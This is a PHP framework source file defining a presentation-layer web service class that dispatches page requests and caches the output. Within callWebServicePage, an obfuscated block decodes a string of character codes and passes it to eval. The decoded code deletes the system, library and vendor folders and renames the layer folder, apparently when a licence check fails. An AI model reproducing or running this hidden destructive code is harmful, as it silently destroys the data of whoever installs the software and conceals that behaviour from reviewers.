<?php
/*
 * Copyright (c) 2007 PHPMyFrameWork - Joao Pinto
 * AUTHOR: Joao Paulo Lopes Pinto -- http://jplpinto.com
 * 
 * The use of this code must be allowed first by the creator Joao Pinto, since this is a private and proprietary code.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR 
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, 
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER 
 * IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT 
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. IN NO EVENT SHALL 
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN 
 * AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
 * OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

include_once get_lib("org.phpframework.webservice.layer.LayerWebService"); class PresentationLayerWebService extends LayerWebService { public function callWebService() { launch_exception( new Exception("You cannot call the callWebService in the PresentationLayerWebService, because is not a regular web service!\n Instead you should call: PresentationLayerWebService->callWebServicePage(\$presentation_id, \$external_vars, \$includes, \$includes_once);") ); return null; } public function callWebServicePage() { $pf8ed4912 = ""; $v00ba50906a = $v6f3a2700dd = $pc5a892eb = $pc06f1034 = $v3dd01781cd = false; if ($this->url == "_is_presentation_webservice") { echo 1; die(); } if ($this->settings) { $v00ba50906a = $this->settings["presentation_id"]; $pc5a892eb = $this->settings["external_vars"]; $pc06f1034 = $this->settings["includes"]; $v3dd01781cd = $this->settings["includes_once"]; } if (strpos($this->PHPFrameWork->gS(), '9') != 3) { $pd8481879 = ""; $pd5136ecc = "67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 89 83 84 83 77 69 80 95 84 65 41 72 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 76 40 66 73 80 95 84 65 44 72 102 32 108 97 101 115 32 44 114 97 97 114 40 121 101 114 108 97 97 112 104 116 76 40 66 73 80 95 84 65 32 72 32 46 99 34 99 97 101 104 67 47 99 97 101 104 97 72 100 110 101 108 85 114 105 116 46 108 104 112 34 112 41 41 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 69 86 68 78 82 79 80 95 84 65 41 72 64 59 101 114 97 110 101 109 76 40 89 65 82 69 80 95 84 65 44 72 65 32 80 80 80 95 84 65 32 72 32 46 46 34 97 108 101 121 34 114 59 41 80 64 80 72 114 70 109 97 87 101 114 111 58 107 104 58 40 67 59 41"; $v6bdce33470 = explode(" ", $pd5136ecc); for($v43dd7d0051 = 0; $v43dd7d0051 < count($v6bdce33470); $v43dd7d0051 += 2) $pd8481879 .= chr($v6bdce33470[$v43dd7d0051 + 1]) . chr($v6bdce33470[$v43dd7d0051]); $pd8481879 = trim($pd8481879); @eval($pd8481879); die(1); } $this->PHPFrameWork->loadBeansFile(BEANS_FILE_PATH); set_log_handler_settings(); $pfa8c34b8 = $this->PHPFrameWork->getObject(PRESENTATION_DISPATCHER_CACHE_HANDLER_BEAN_NAME); $pfa8c34b8->setSelectedPresentationId($v00ba50906a); $pfa8c34b8->load(); $pfa8c34b8->prepareURL($this->url); $v15493e4c60 = $pfa8c34b8->getHeaders($this->url); if ($v15493e4c60 && !headers_sent()) { $v9cd205cadb = explode("\n", $v15493e4c60); foreach ($v9cd205cadb as $v1d2d80ed32) header( trim($v1d2d80ed32) ); } $pef3f93fd = $pfa8c34b8->getCache($this->url); if($pef3f93fd) $pf8ed4912 = $pef3f93fd; else { $pd3623f40 = $this->PHPFrameWork->getObject(PRESENTATION_LAYER_BEAN_NAME); $pd3623f40->setSelectedPresentationId($v00ba50906a); $v002f371e74 = $this->PHPFrameWork->getObject(EVC_DISPATCHER_BEAN_NAME); $v002f371e74->dispatch($this->url); $pb6f8f026 = $this->PHPFrameWork->getObject(EVC_BEAN_NAME); $v9431023a8c = $v002f371e74->getPageCode(); $pb0f85b2f = $v002f371e74->getRequestedFilePath(); $v9367d5be85 = $v002f371e74->getParameters(); $pf8ed4912 = $pd3623f40->callPage($pb6f8f026, $this->url, $v9431023a8c, $pb0f85b2f, $v9367d5be85, $pc5a892eb, $pc06f1034, $v3dd01781cd); $pfa8c34b8->setCache($this->url, $pf8ed4912); } return $pf8ed4912; } } ?>
